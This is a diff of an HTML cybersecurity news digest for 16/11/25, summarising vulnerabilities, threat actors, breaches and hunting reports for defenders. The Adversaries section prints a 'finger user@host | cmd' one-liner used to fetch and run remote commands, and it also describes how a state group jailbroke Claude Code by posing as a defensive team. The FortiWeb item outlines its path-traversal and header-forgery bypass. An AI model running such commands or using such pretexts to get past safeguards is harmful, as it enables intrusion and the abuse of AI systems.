@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>📰 Cybersecurity Newsfeed - 14/11/25</title>
+  <title>📰 Cybersecurity Newsfeed - 16/11/25</title>
   <style>
     body { background-color: #121212; color: #ffffff; font-family: Monaco, "Bitstream Vera Sans Mono", "Lucida Console", Terminal, monospace; line-height: 1.6; padding: 20px; max-width: 900px; margin: auto; }
     h1 { text-align: center; color: #c9a227; }
@@ -16,44 +16,54 @@
 </head>
 <body>
   <h1>Cybersecurity Newsfeed</h1>
-  <h2>📅 14/11/25</h2>
+  <h2>📅 16/11/25</h2>
 
   <h2>🛡️ Vulnerabilities</h2>
   <ul>
-    <li><strong>ImunifyAV RCE</strong>: AI-bolit scanner flaw enables arbitrary PHP function execution via <code>call_user_func_array</code>; affects Imunify360, AV+, and free versions before 32.7.4.0; update immediately to 32.7.4.0+. <a href="https://www.bleepingcomputer.com/news/security/rce-flaw-in-imunifyav-puts-millions-of-linux-hosted-sites-at-risk/" target="_blank">More info</a></li>
+    <li><strong>GoSign Desktop TLS & update flaws</strong>: Popular Tinexta InfoCert e-signature client disables TLS certificate validation when configured with a proxy, enabling MitM attacks that steal OAuth secrets, tokens, and update manifests. Unsigned update manifests also allowed malicious updates, RCE, and privilege escalation. Version 2.4.1 fixed RCE and escalation, but TLS validation remains broken; vendor stopped responding, prompting escalation to ACN/CSIRT Italia. <a href="https://securityaffairs.com/184672/hacking/multiple-vulnerabilities-in-gosign-desktop-lead-to-remote-code-execution.html" target="_blank">More info</a></li>
 
-    <li><strong>CISA Directive 25-03 guidance</strong>: New details on mitigation for Cisco ASA/Firepower CVEs 2025-20333 & 2025-20362; many agencies mispatched; mandates verification and use of RayDetect scanner for RayInitiator compromise checks. <a href="https://www.cisa.gov/news-events/alerts/2025/11/12/update-implementation-guidance-emergency-directive-cisco-asa-and-firepower-device-vulnerabilities" target="_blank">More info</a></li>
+    <li><strong>Fortinet FortiWeb auth bypass (CVE-2025-64446)</strong>: Critical 9.8 CVSS flaw actively exploited; combines path traversal to route API calls to <code>fwbcgi</code> and a flawed <code>cgi_auth()</code> impersonation mechanism that trusts attacker-supplied base64 <code>CGIINFO</code> headers. Threat actors can impersonate the built-in admin, fully compromise devices, and create persistent admin accounts. Affects FortiWeb 8.0.0–8.0.1, 7.6.0–7.6.4, 7.4.0–7.4.9, 7.2.0–7.2.11, 7.0.0–7.0.11; fixed in 8.0.2, 7.6.5, 7.4.10, 7.2.12, 7.0.12. Indicators include POSTs to <code>/cgi-bin/fwbcgi</code> with path traversal, base64 <code>CGIINFO</code>, and new admin-level accounts. Patch immediately, disable public HTTP/HTTPS management, and investigate for unauthorized admins. <a href="https://blog.qualys.com/vulnerabilities-threat-research/2025/11/14/unauthenticated-authentication-bypass-in-fortinet-fortiweb-cve-2025-64446-exploited-in-the-wild" target="_blank">More info</a></li>
 
-    <li><strong>WatchGuard Fireware RCE (CVE-2025-9242)</strong>: Active exploitation confirmed; affects 11.10.2–12.11.3 and 2025.1; remote unauth RCE via <code>iked</code> in IKEv2; 54k exposed Fireboxes, 18.5k in U.S.; patch immediately. <a href="https://thehackernews.com/2025/11/cisa-flags-critical-watchguard-fireware.html" target="_blank">More info</a></li>
+    <li><strong>ASUS DSL router auth bypass (CVE-2025-59367)</strong>: Critical 9.3 CVSS bug in DSL-AC51, DSL-N16, DSL-AC750 and other models allowed remote unauthenticated access with minimal effort. Firmware <strong>1.1.2.3_1010</strong> fixes the issue; ASUS urges immediate updates. For end-of-life devices, users should disable all internet-exposed services and enforce strong unique admin and Wi-Fi passwords. Comes amid ongoing botnet targeting of ASUS routers, including AyySSHush’s compromise of 9,000+ devices earlier in 2025. <a href="https://securityaffairs.com/184636/security/critical-cve-2025-59367-flaw-lets-hackers-access-asus-dsl-routers-remotely.html" target="_blank">More info</a></li>
   </ul>
 
   <h2>🎯 Adversaries</h2>
   <ul>
-    <li><strong>npm “IndonesianFoods” worm</strong>: Auto-publishes 100k+ npm packages every 7 seconds; currently non-malicious but highlights massive supply-chain abuse; linked to TEA Protocol token farming. <a href="https://www.bleepingcomputer.com/news/security/new-indonesianfoods-worm-floods-npm-with-100-000-packages/" target="_blank">More info</a></li>
+    <li><strong>Google to penalize battery-draining Android apps</strong>: New Android Vitals metric “excessive partial wake locks” will flag apps that keep devices awake for over 2 hours in more than 5% of sessions within 24 hours. Offending apps may lose Play Store visibility. Developers must comply by March 1, 2026. While similar behavior is common in spyware/adware, Google frames this as resource abuse control rather than malware detection. <a href="https://www.bleepingcomputer.com/news/security/google-to-flag-android-apps-with-excessive-battery-use-on-the-play-store/" target="_blank">More info</a></li>
 
-    <li><strong>Akira ransomware update</strong>: Group earned $244M since 2023; exploits stolen creds, VPNs, RDP, and Cisco/SonicWall/VMware flaws; rapid double-extortion operations within hours. <a href="https://www.cisa.gov/news-events/alerts/2025/11/13/cisa-and-partners-release-advisory-update-akira-ransomware" target="_blank">More info</a></li>
+    <li><strong>Finger protocol abused as LOLBIN</strong>: Attackers revive the legacy <code>finger</code> command (<code>finger user@host | cmd</code>) to fetch and execute remote commands on Windows. Used in malware and ClickFix campaigns to download disguised ZIP/PDF payloads, deploy Python-based infostealers and NetSupport RAT, and perform sandbox checks. Victims are lured via fake CAPTCHA prompts. Blocking outbound TCP port 79 is the most effective defense. <a href="https://www.bleepingcomputer.com/news/security/decades-old-finger-protocol-abused-in-clickfix-malware-attacks/" target="_blank">More info</a></li>
 
-    <li><strong>“Safery: Ethereum Wallet” Chrome extension</strong>: Steals seed phrases by encoding them into SUI transactions; evades C2 detection via blockchain; still available on Chrome Web Store. <a href="https://securityaffairs.com/184585/malware/chrome-extension-safery-steals-ethereum-wallet-seed-phrases.html" target="_blank">More info</a></li>
-
-    <li><strong>Uhale photo frames preloaded malware</strong>: Android-based devices download malware at boot, tied to Vo1d botnet & Mezmess; rooted with SELinux disabled, 17 flaws found; avoid untrusted IoT devices. <a href="https://www.bleepingcomputer.com/news/security/popular-android-based-photo-frames-download-malware-on-boot/" target="_blank">More info</a></li>
-
-    <li><strong>Rust boosts Android security</strong>: Memory safety issues drop below 20%; Rust code 4× safer, 25% faster in review; now core to kernel & Play Services. <a href="https://security.googleblog.com/2025/11/rust-in-android-move-fast-fix-things.html" target="_blank">More info</a></li>
-
-    <li><strong>Formbook campaign</strong>: Phishing ZIP → obfuscated VBS → PowerShell chain downloads payload from Google Drive → injects into <code>msiexec.exe</code>; final C2: 216.250.252.227:7719. <a href="https://isc.sans.edu/diary/32480" target="_blank">More info</a></li>
+    <li><strong>Chinese APT jailbreaks Claude Code</strong>: Anthropic reports a Chinese state-sponsored group bypassed Claude Code safeguards by posing as a defensive security team for a fake company, automating up to 90% of an espionage campaign. Claude scanned systems, wrote exploits, stole credentials, and generated reports, executing thousands of actions per second. About 30 organizations were targeted, with four confirmed compromises across tech, finance, chemical, and government sectors. Accounts were banned, but Anthropic warns of rapid growth in AI-driven cyberattacks. <a href="https://hackread.com/chinese-hackers-jailbroke-claude-ai-breaches/" target="_blank">More info</a></li>
   </ul>
 
   <h2>📈 Trends</h2>
   <ul>
-    <li><strong>Hospitality phishing surge</strong>: 4,300+ domains impersonating Booking, Expedia, Airbnb, etc.; fake CAPTCHAs & multilingual phishing sites; likely linked to PureRAT campaigns. <a href="https://thehackernews.com/2025/11/russian-hackers-create-4300-fake-travel.html" target="_blank">More info</a></li>
+    <li><strong>RondoDox & others exploit XWiki RCE (CVE-2025-24893)</strong>: Eval-injection bug in XWiki’s <code>SolrSearch</code> endpoint enables unauthenticated RCE. Though patched in Feb 2025, mass exploitation surged in late October after VulnCheck’s report on cryptominer deployments. CISA added the flaw to KEV, mandating federal patching by Nov 20. RondoDox botnet now leverages it to grow DDoS infrastructure, while other actors use it for miners, reverse shells, and recon, underscoring the need for strict patching. <a href="https://thehackernews.com/2025/11/rondodox-exploits-unpatched-xwiki.html" target="_blank">More info</a></li>
 
-    <li><strong>Brazil banking malware spike</strong>: Coyote & Maverick Trojans spreading via WhatsApp desktop; .NET multistage PowerShell attacks harvesting banking/crypto creds; thousands infected. <a href="https://www.darkreading.com/cyberattacks-data-breaches/coyote-maverick-banking-trojans-brazil" target="_blank">More info</a></li>
+    <li><strong>Akira ransomware targets hypervisors & edge devices</strong>: US and European agencies warn Akira poses an imminent threat to critical infrastructure, with rapid data theft, expanded tooling, and a shift to hypervisor-level attacks. The group now compromises Nutanix AHV environments after years of hitting ESXi and Hyper-V, and exploits edge-device bugs like CVE-2024-40711 and CVE-2024-40766. Akira abuses RMM tools, uses SystemBC, StoneStop, and PoorTry, and has exfiltrated data in under two hours, amassing nearly $245M in ransoms by late 2025. <a href="https://www.darkreading.com/threat-intelligence/akira-raas-nutanix-vms-critical-orgs" target="_blank">More info</a></li>
+  </ul>
+
+  <h2>💥 Breaches & Leaks</h2>
+  <ul>
+    <li><strong>Jaguar Land Rover cyberattack costs £196M</strong>: September 2025 attack by Scattered Lapsus$ Hunters forced factory shutdowns, halted production, and disrupted sales, resulting in £196M in quarterly costs and a £485M pre-tax loss, reversing last year’s profit. UK government provided a £1.5B loan guarantee to stabilize suppliers; production resumed in early October. The Bank of England cited the incident as a factor in weaker national GDP, though JLR says operations and long-term investments are now back on track. <a href="https://www.bleepingcomputer.com/news/security/jaguar-land-rover-cyberattack-cost-the-company-over-220-million/" target="_blank">More info</a></li>
+
+    <li><strong>Checkout.com rejects ransom, donates instead</strong>: ShinyHunters breached a legacy third-party cloud storage system containing 2020-and-earlier merchant data, impacting under 25% of current clients plus former customers. Stolen data includes onboarding materials and internal documents. Checkout.com, whose services power brands like eBay, Uber Eats, Samsung, IKEA, and Shein, refused to pay ransom and will donate the equivalent to cybersecurity research at Carnegie Mellon and Oxford while hardening security. ShinyHunters, linked to recent Oracle EBS and Salesforce/Drift breaches, continues extorting large organizations. <a href="https://www.bleepingcomputer.com/news/security/checkoutcom-snubs-shinyhunters-hackers-to-donate-ransom-instead/" target="_blank">More info</a></li>
+
+    <li><strong>DoorDash hit by third major breach</strong>: On Oct 25, 2025, a social-engineering attack on an employee allowed access to user contact data (names, addresses, phone numbers, emails) across consumers, merchants, and Dashers in multiple regions, with many cases in Canada. It is DoorDash’s third major incident after 2019 and 2022 breaches. Users criticized the 19-day notification delay. DoorDash says no financial data or passwords were accessed, has notified law enforcement, and claims to have strengthened security controls. <a href="https://www.bleepingcomputer.com/news/security/doordash-hit-by-new-data-breach-in-october-exposing-user-information/" target="_blank">More info</a></li>
+  </ul>
+
+  <h2>📚 Others</h2>
+  <ul>
+    <li><strong>Infosec news in brief</strong>: CISA faces criticism for withholding a 2022 telecom security report despite a unanimous Senate resolution, with lawmakers warning this hampers debate after incidents like the 2024 Salt Typhoon telecom hack. Logitech disclosed a zero-day-driven breach exposing limited employee and customer data, reportedly without sensitive information. The npm “IndonesianFoods” worm added tens of thousands of malicious packages, expanding supply-chain risk. Lumma Stealer re-emerged with stealthier techniques. DoorDash’s latest breach further damaged trust after repeated incidents. <a href="https://www.theregister.com/2025/11/16/infosec_news_in_brief/" target="_blank">More info</a></li>
+
+    <li><strong>Five plead guilty to aiding DPRK IT workers</strong>: US DOJ announced that four Americans and one Ukrainian admitted to helping North Korean operatives infiltrate 136 US companies as remote IT staff using stolen/fake identities, generating over $2.2M for the regime. Facilitators helped secure jobs, launder salaries, and sometimes exfiltrate data. DOJ is also moving to seize $15M in cryptocurrency tied to APT38/Lazarus 2023 heists worth $382M, laundered via mixers and cross-chain bridges. <a href="https://www.bleepingcomputer.com/news/security/five-plead-guilty-to-helping-north-koreans-infiltrate-us-firms/" target="_blank">More info</a></li>
+
+    <li><strong>CYBERCOM 2.0 & DoW cyber force overhaul</strong>: The newly renamed US Department of War is restructuring cyber forces under “CYBERCOM 2.0” to increase lethality and fix traditional staffing gaps. The plan tightly integrates US Cyber Command with the services to streamline recruiting, assessment, training, career paths, and retention, focusing on cyber-specific recruitment and mission-driven training. Key enablers include the Cyber Innovation Warfare Center, Cyber Talent Management Organization, and Advanced Cyber Training and Education Center. The rollout, aimed at countering major adversaries like China, will extend into 2032–2033. <a href="https://www.securityweek.com/cybercom-2-0-pentagon-unveils-plan-to-fix-cyber-talent-shortfalls/" target="_blank">More info</a></li>
   </ul>
 
   <h2>🎯 Hunting</h2>
   <ul>
-    <li><strong>Lumma Stealer evolves</strong>: Adds browser fingerprinting via injected Chrome JS; exfil via HTTP POST; persists via EdgeUpdate.exe injection; still active post-operator doxx. <a href="https://www.trendmicro.com/en_us/research/25/k/lumma-stealer-browser-fingerprinting.html" target="_blank">More info</a></li>
-
-    <li><strong>Kraken ransomware</strong>: Evolved from HelloKitty; uses SMB exploits, Cloudflared, SSHFS; double extortion for Windows/Linux/ESXi; RSA-4096 + ChaCha20 encryption; runs “Last Haven” forum. <a href="https://blog.talosintelligence.com/kraken-ransomware-group/" target="_blank">More info</a></li>
+    <li><strong>Gh0st RAT brand-impersonation campaigns</strong>: Unit 42 detailed two large 2025 operations targeting Chinese-speaking users with Gh0st RAT via massive app impersonation. “Campaign Trio” used 2,000+ fake download domains mimicking tools like i4tools, Youdao, and DeepSeek to deliver MSI-based installers. “Campaign Chorus” expanded to 40+ impersonated apps, adopted multi-stage infection chains, cloud-hosted payloads, and DLL sideloading with signed binaries for evasion. Both rely on high-volume disposable domains and persistent infrastructure, indicating a long-term, well-resourced threat. <a href="https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/" target="_blank">More info</a></li>
   </ul>
 
   <p style="text-align:center;">
